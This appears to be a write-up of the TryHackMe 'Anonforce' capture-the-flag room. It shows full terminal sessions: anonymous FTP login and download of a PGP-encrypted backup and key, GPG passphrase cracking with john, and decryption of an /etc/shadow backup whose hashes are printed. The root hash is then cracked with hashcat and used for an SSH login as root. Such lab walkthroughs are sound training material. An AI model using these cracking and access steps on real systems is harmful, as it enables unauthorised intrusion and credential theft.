# Target
| Category          | Details                                                   |
|-------------------|-----------------------------------------------------------|
| 📝 **Name**       | [Anonforce](https://tryhackme.com/room/bsidesgtanonforce) |  
| 🏷 **Type**       | THM Challenge                                             |
| 🖥 **OS**         | Linux                                                     |
| 🎯 **Difficulty** | Easy                                                      |
| 📁 **Tags**       | FTP, GPG, john, hashcat                                   |

# Scan
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
| drwxr-xr-x   17 0        0            3700 Dec 05 08:12 dev
| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
| drwx------    2 0        0           16384 Aug 11  2019 lost+found
| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
| dr-xr-xr-x   95 0        0               0 Dec 05 08:12 proc
| drwx------    3 0        0            4096 Aug 11  2019 root
| drwxr-xr-x   18 0        0             540 Dec 05 08:12 run
| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
| dr-xr-xr-x   13 0        0               0 Dec 05 08:12 sys
|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.132.170
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
|_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
```

# Attack path
1. [Exfiltrate `backup.pgp` using anonymous FTP access and decrypt it using `private.asc`](#exfiltrate-backuppgp-using-anonymous-ftp-access-and-decrypt-it-using-privateasc)
2. [Crack password for `root` user and use it to gain access over SSH](#crack-password-for-root-user-and-use-it-to-gain-access-over-ssh)

### Exfiltrate `backup.pgp` using anonymous FTP access and decrypt it using `private.asc`

#### Download `backup.pgp` and `private.asc` using anonymous FTP access
```
┌──(magicrc㉿perun)-[~/attack/THM Anonforce]
└─$ ftp anonymous@$TARGET                                                          
Connected to 10.80.136.254.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||16954|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
drwxr-xr-x   17 0        0            3700 Dec 06 07:16 dev
drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
drwx------    2 0        0           16384 Aug 11  2019 lost+found
drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
dr-xr-xr-x  100 0        0               0 Dec 06 07:16 proc
drwx------    3 0        0            4096 Aug 11  2019 root
drwxr-xr-x   18 0        0             540 Dec 06 07:16 run
drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
dr-xr-xr-x   13 0        0               0 Dec 06 07:16 sys
drwxrwxrwt    9 0        0            4096 Dec 06 07:17 tmp
drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
226 Directory send OK.
ftp> cd notread
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||44074|)
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
226 Directory send OK.
ftp> get backup.pgp
local: backup.pgp remote: backup.pgp
229 Entering Extended Passive Mode (|||6415|)
150 Opening BINARY mode data connection for backup.pgp (524 bytes).
100% |*******************************************************************************************************************************************************|   524      723.78 KiB/s    00:00 ETA
226 Transfer complete.
524 bytes received in 00:00 (10.73 KiB/s)
ftp> get private.asc
local: private.asc remote: private.asc
229 Entering Extended Passive Mode (|||22505|)
150 Opening BINARY mode data connection for private.asc (3762 bytes).
100% |*******************************************************************************************************************************************************|  3762        3.62 MiB/s    00:00 ETA
226 Transfer complete.
3762 bytes received in 00:00 (86.13 KiB/s)
```

#### Import `private.asc` private GPG key
```
┌──(magicrc㉿perun)-[~/attack/THM Anonforce]
└─$ gpg --import private.asc
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: key B92CD1F280AD82C2/B92CD1F280AD82C2: error sending to agent: No passphrase given
gpg: error building skey array: No passphrase given
gpg: error reading 'private.asc': No passphrase given
gpg: import from 'private.asc' failed: No passphrase given
gpg: Total number processed: 0
gpg:              unchanged: 1
gpg:       secret keys read: 1
```
Key is protected with passphrase.

#### Extract hash from GPG key
```
┌──(magicrc㉿perun)-[~/attack/THM Anonforce]
└─$ gpg2john private.asc > private.asc.hash

File private.asc
```

#### Use `john` to crack passphrase
```
┌──(magicrc㉿perun)-[~/attack/THM Anonforce]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt private.asc.hash
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xbox360          (anonforce)     
1g 0:00:00:00 DONE (2025-12-06 16:27) 3.703g/s 3451p/s 3451c/s 3451C/s lawrence..murphy
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

#### Import `private.asc` private GPG key using cracked  passphrase
```
┌──(magicrc㉿perun)-[~/attack/THM Anonforce]
└─$ gpg --import private.asc                 
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: key B92CD1F280AD82C2: secret key imported
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: Total number processed: 2
gpg:              unchanged: 2
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```

#### Decrypt `backup.pgp` using imported GPG key
```
┌──(magicrc㉿perun)-[~/attack/THM Anonforce]
└─$ gpg backup.pgp          
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: encrypted with elg512 key, ID AA6268D1E6612967, created 2019-08-12
      "anonforce <melodias@anonforce.nsa>"
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
```
                                   
#### List content of decrypted file
```
┌──(magicrc㉿perun)-[~/attack/THM Anonforce]
└─$ cat backup                   
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
<SNIP>
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
<SNIP>
```
It seems that this is backup of `/etc/shadow`.

### Crack password for `root` user and use it to gain access over SSH

#### Use hashcat to crack `root` password
```
┌──(magicrc㉿perun)-[~/attack/THM Anonforce]
└─$ hashcat -m 1800 '$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0' /usr/share/wordlists/rockyou.txt --quiet
$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:hikari
```

#### Use cracked password to gain access as `root` user over SSH
```
┌──(magicrc㉿perun)-[~/attack/THM Anonforce]
└─$ ssh root@$TARGET
<SNIP>
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
```